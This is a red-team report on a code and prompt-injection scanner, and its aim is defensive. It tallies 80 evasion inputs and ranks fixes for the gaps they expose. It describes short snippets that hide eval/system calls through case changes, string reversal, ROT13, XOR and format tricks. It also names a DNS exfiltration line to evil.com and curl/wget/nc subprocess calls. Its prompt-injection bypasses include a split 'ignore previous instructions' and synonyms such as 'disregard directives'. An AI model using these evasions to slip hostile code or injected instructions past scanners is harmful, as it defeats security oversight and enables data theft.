# Full Scanner Red-Team Report — 2026-03-17

## Summary

| Category | Inputs | Detected | Evaded | Rate | Severity |
|---|---|---|---|---|---|
| Split-evasion + kwargs | 24 | 1 | 23 | **96%** | CRITICAL |
| Code execution (EXEC-*) | 20 | 11 | 9 | **45%** | HIGH |
| Exfil + obfuscation + decoder | 20 | 13 | 7 | **35%** | HIGH |
| Prompt injection (PI-*) | 16 | 12 | 4 | **25%** | MEDIUM |
| **Overall** | **80** | **37** | **43** | **54%** | |

## Context

The split-kwargs category intentionally targets known resolver edge cases, so the 96%
rate overstates real-world risk — attackers would need to know exactly which AST forms
the scanner doesn't resolve. The exec-evasion and exfil-obfs categories are more
representative of practical attack scenarios.

**Adjusted practical evasion rate** (excluding split-kwargs targeted edge cases):
20 evasions / 56 inputs = **36%** across exec, exfil-obfs, and PI categories.

---

## Findings by Priority

### P0 — Trivial bypasses (fix immediately)

1. **`str.lower()` / `str.upper()`** — `'EVAL'.lower()` completely evades.
   Only `.replace()` is tracked among string methods.
   Fix: Add case-transform resolver in `_ast_split_resolve.py`.
   Files: `exec-evasion/string_method_evasion.py`

2. **Multi-target assignment** — `a = b = 'eval'` silently dropped.
   `_handle_assign` gates on `len(targets)==1`.
   Fix: Iterate all targets in `_ast_symbol_table_helpers.py`.
   Files: `split-kwargs-evasion/split_multi_assign.py`

3. **NFKC normalization** — Fullwidth characters (`U+FF41`-`U+FF5A`) pass through.
   `normalize_text()` handles zero-width and exotic whitespace but not NFKC.
   Fix: Add `unicodedata.normalize('NFKC', text)` to `normalizer.py`.
   Files: `pi-evasion/docs/fullwidth.md`

### P1 — Significant gaps (should fix soon)

4. **`str.format()` keyword args** — `'{x}'.format(x='eval')` returns None.
   `_resolve_format_call` explicitly rejects `node.keywords`.
   Fix: Resolve keyword args by name, substitute `{name}` placeholders.
   Files: `split-kwargs-evasion/split_format_keywords.py`

5. **`str.format_map()`** — Not handled at all in resolver chain.
   Fix: Mirror `_resolve_format_call` logic for `.format_map(dict)`.
   Files: `exec-evasion/format_map_evasion.py`

6. **String reversal `[::-1]`** — `_resolve_slice_expr` rejects step <= 0.
   Python `[::-1]` is well-defined.
   Fix: Support negative step (reversal) in slice resolver.
   Files: `split-kwargs-evasion/split_reverse.py`

7. **`try/except` imports** — `build_alias_map` only walks `tree.body`.
   Imports inside `try:` blocks (common pattern) are invisible.
   Fix: Recurse into `ast.Try` handlers in `_ast_helpers.py`.
   Files: `exec-evasion/try_except_evasion.py`

8. **`subprocess(['curl', ...])`** — EXFIL-001 only matches shell-style `curl -s -d`.
   Subprocess with list args containing network tools evades entirely.
   Fix: Add rule detecting subprocess calls with curl/wget/nc in args.
   Files: `exfil-obfs-evasion/exfil_subprocess_curl.py`

9. **`map(lambda c: chr(c), [...])`** — `_resolve_map_join` requires `ast.Name` func.
   Trivial lambda wrapper around `chr()` evades.
   Fix: Detect `lambda c: chr(c)` pattern, treat as equivalent to `map(chr, ...)`.
   Files: `split-kwargs-evasion/split_map_lambda.py`

10. **`dict.update()` for kwargs** — Not tracked in `_collect_dict_assigns`.
    Same gap that int-list tracking had before `.extend()` support.
    Fix: Add `_handle_update_call` parallel to int-list's `_handle_extend_call`.
    Files: `split-kwargs-evasion/kwargs_method_chain.py`

### P2 — Moderate gaps (plan before fixing)

11. **Star imports** — `from os import *; system()` invisible.
    Fix: For known-dangerous modules, inject dangerous names into alias map.
    Files: `exec-evasion/star_import_evasion.py`

12. **Multi-line PI split** — "ignore\nprevious\ninstructions" across lines.
    Fix: Sliding-window cross-line matcher for critical PI patterns.
    Files: `pi-evasion/docs/guide.md`

13. **Custom ROT13** — Manual `chr()`/`ord()` rotation without `codecs`.
    Fix: Heuristic for functions iterating chars with chr/ord arithmetic.
    Files: `exfil-obfs-evasion/obfs_rot13_custom.py`

14. **DNS exfil via f-string** — `getaddrinfo(f'{data}.evil.com', 80)`.
    EXFIL-006 requires literal `+` operator in getaddrinfo args.
    Fix: Match any non-literal first arg in getaddrinfo calls.
    Files: `exfil-obfs-evasion/exfil_dns_txt.py`

15. **Short hex fragments** — Two `bytes.fromhex('XX')` calls concatenated.
    Under `MIN_ENCODED_LENGTH`, and cross-call concat not tracked.
    Fix: Track bytes concatenation in split-evasion detector.
    Files: `exfil-obfs-evasion/obfs_hex_split.py`

16. **Nested comprehension** — Double `for` clause in listcomp.
    Fix: Extend `_resolve_join_listcomp` for multiple generators.
    Files: `exec-evasion/nested_comprehension.py`

17. **Loop assembly** — `for c in ['e','v','a','l']: name += c`.
    Fix: Limited static unrolling for `for c in [literal_list]` patterns.
    Files: `exec-evasion/loop_assembly.py`

### P3 — Known debt (already tracked, confirm priority)

18. **Class-level int-list** (DEBT-028-INTLIST-CLASS-BODY) — Confirmed exploitable.
19. **Int-list concat via +** (DEBT-027-INTLIST-CONCAT) — Confirmed exploitable.
20. **extend(tracked_var)** (DEBT-027-INTLIST-EXTEND-VAR) — Confirmed exploitable.
21. **Int-list branch merge** (DEBT-028-INTLIST-BRANCH-MERGE) — Confirmed exploitable.

### P4 — Semantic / hard problems (accept or research)

22. **Semantic equivalent PI** — Synonym injection ("disregard directives").
    Regex patterns fundamentally cannot catch semantic equivalents.
    Would require NLP/embedding-based detection.
    Files: `pi-evasion/docs/changelog.md`

23. **Indirect reference PI** — "Do what line 5 says".
    Requires understanding document structure and cross-references.
    Files: `pi-evasion/data/prompts.txt`

24. **XOR byte manipulation** — `chr(b ^ key)` decoding.
    Arbitrary arithmetic on bytes is a full program analysis problem.
    Files: `exec-evasion/bytes_xor_evasion.py`, `split-kwargs-evasion/split_bytes_xor.py`

---

## Relationship to Existing Debt

| Debt Item | Red-Team Confirmed? | New Priority |
|---|---|---|
| DEBT-021-NONLOCAL-MULTILEVEL | Not tested (no corpus input) | Unchanged (low) |
| DEBT-045-CALL-RETURN-LABEL-PROPAGATION | Not tested (cosmetic) | Unchanged (low) |
| DEBT-028-INTLIST-CLASS-BODY | Confirmed exploitable | Raise to medium |
| DEBT-027-INTLIST-CONCAT | Confirmed exploitable | Raise to medium |
| DEBT-028-INTLIST-GLOBAL-NONLOCAL | Not tested | Unchanged (low) |
| DEBT-028-INTLIST-BRANCH-MERGE | Confirmed exploitable | Unchanged (low) |
| DEBT-027-INTLIST-EXTEND-VAR | Confirmed exploitable | Raise to medium |

## New Debt Items Surfaced

This red-team surfaced **17 new evasion vectors** not in the current debt.yaml:
- P0: str.lower/upper, multi-target assign, NFKC normalization (3)
- P1: format kwargs, format_map, string reversal, try/except imports,
      subprocess+curl, map(lambda chr), dict.update kwargs (7)
- P2: star imports, multi-line PI, custom ROT13, DNS f-string,
      short hex concat, nested comprehension, loop assembly (7)

---

## Recommended Plan Sequence

1. **Quick wins plan** (P0 + easiest P1): str.lower, multi-target assign, NFKC,
   format kwargs, string reversal, try/except imports, map(lambda chr).
   Estimate: ~8 focused fixes, each under 20 lines.

2. **Exfil hardening plan** (P1-P2 exfil): subprocess+curl rule, DNS f-string,
   short hex tracking. 3 fixes.

3. **Resolver expansion plan** (remaining P1-P2 AST): format_map, dict.update,
   nested comprehension, loop assembly, star imports. 5 fixes.

4. **PI hardening plan** (P2 PI): NFKC (in quick wins), multi-line window.
   2 fixes but multi-line is architecturally significant.

5. **Debt cleanup** (P3): Existing DEBT items now confirmed exploitable.
